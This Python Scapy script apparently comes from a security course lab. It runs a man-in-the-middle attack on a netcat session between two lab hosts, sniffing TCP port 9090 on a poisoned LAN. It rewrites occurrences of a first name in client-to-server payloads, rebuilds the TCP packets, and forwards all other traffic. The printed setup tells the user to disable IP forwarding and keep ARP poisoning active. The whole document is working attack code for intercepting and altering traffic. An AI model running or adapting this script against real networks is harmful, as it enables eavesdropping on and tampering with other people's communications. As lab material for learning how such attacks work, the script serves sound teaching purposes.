#!/usr/bin/env python3
from scapy.all import *
import os

# --- Configuration ---
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05" # Actual MAC of Host A
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06" # Actual MAC of Host B

ATTACKER_MAC = "02:42:0a:09:00:69" # Host M's MAC address
INTERFACE = "eth0" # Interface Host M uses on the 10.9.0.0/24 network

# !!! IMPORTANT: Replace "YourFirstName" with your actual first name !!!
USER_FIRST_NAME = "Jesus" 
REPLACEMENT_STRING = "A" * len(USER_FIRST_NAME)

def spoof_pkt(pkt):
    if not IP in pkt: # Ensure packet has IP layer
        return

    # Packet from A (Client) to B (Server)
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        if TCP in pkt and Raw in pkt: # Check for TCP payload
            original_payload_bytes = pkt[Raw].load
            try:
                original_payload_str = original_payload_bytes.decode()
            except UnicodeDecodeError:
                # If payload is not valid UTF-8, forward without modification or handle as binary
                print(f"[A->B] Non-UTF8 payload, forwarding as is.")
                pkt[Ether].src = ATTACKER_MAC
                pkt[Ether].dst = MAC_B
                if IP in pkt: del pkt[IP].chksum
                if TCP in pkt: del pkt[TCP].chksum
                sendp(pkt, iface=INTERFACE, verbose=False)
                return

            if USER_FIRST_NAME in original_payload_str:
                modified_payload_str = original_payload_str.replace(USER_FIRST_NAME, REPLACEMENT_STRING)
                modified_payload_bytes = modified_payload_str.encode()

                print(f"[A->B] Original: '{original_payload_str.strip()}' | Modified to: '{modified_payload_str.strip()}'")

                new_ether = Ether(src=ATTACKER_MAC, dst=MAC_B)
                new_ip = IP(src=pkt[IP].src, dst=pkt[IP].dst, id=pkt[IP].id, ttl=pkt[IP].ttl)
                new_tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                              flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack,
                              window=pkt[TCP].window, options=pkt[TCP].options)

                response_pkt = new_ether/new_ip/new_tcp/modified_payload_bytes

                if IP in response_pkt: del response_pkt[IP].chksum
                if TCP in response_pkt: del response_pkt[TCP].chksum

                sendp(response_pkt, iface=INTERFACE, verbose=False)
            else:
                # print(f"[A->B] Name not found, forwarding as is: '{original_payload_str.strip()}'")
                pkt[Ether].src = ATTACKER_MAC
                pkt[Ether].dst = MAC_B
                if IP in pkt: del pkt[IP].chksum
                if TCP in pkt: del pkt[TCP].chksum
                sendp(pkt, iface=INTERFACE, verbose=False)
        else: # Not a data packet with payload (e.g. ACK, SYN), just forward
            # print(f"[A->B] Forwarding non-data packet: {pkt.summary()}")
            pkt[Ether].src = ATTACKER_MAC
            pkt[Ether].dst = MAC_B
            if IP in pkt: del pkt[IP].chksum
            if TCP in pkt: del pkt[TCP].chksum
            sendp(pkt, iface=INTERFACE, verbose=False)
        return

    # Packet from B (Server) to A (Client) - Netcat server usually doesn't send much back unless scripted
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # print(f"[B->A] Forwarding: {pkt.summary()}")
        pkt[Ether].src = ATTACKER_MAC
        pkt[Ether].dst = MAC_A

        if IP in pkt: del pkt[IP].chksum
        if TCP in pkt: del pkt[TCP].chksum

        sendp(pkt, iface=INTERFACE, verbose=False)
        return

if __name__ == "__main__":
    if USER_FIRST_NAME == "YourFirstName":
        print("[!!!] WARNING: Please edit the script and replace 'YourFirstName' with your actual first name.")
        exit()

    os.system("clear")
    print("[*] Starting Netcat MITM Sniff-and-Spoof Script...")
    print(f"[*] Attacking Netcat between {IP_A} and {IP_B}")
    print(f"[*] Occurrences of '{USER_FIRST_NAME}' from A to B will be replaced with '{REPLACEMENT_STRING}'.")
    print(f"[*] Ensure IP forwarding is OFF on Host M: sudo sysctl net.ipv4.ip_forward=0")
    print(f"[*] Ensure ARP poisoning is active for both {IP_A} and {IP_B}.")
    print(f"[*] Listening on interface: {INTERFACE}")
    print("----------------------------------------------------------")

    bpf_filter = f"tcp and port 9090 and (host {IP_A} or host {IP_B})"

    try:
        sniff(iface=INTERFACE, filter=bpf_filter, prn=spoof_pkt, store=0)
    except Exception as e:
        print(f"[!] An error occurred: {e}")
    finally:
        print("[*] MITM script stopped.")
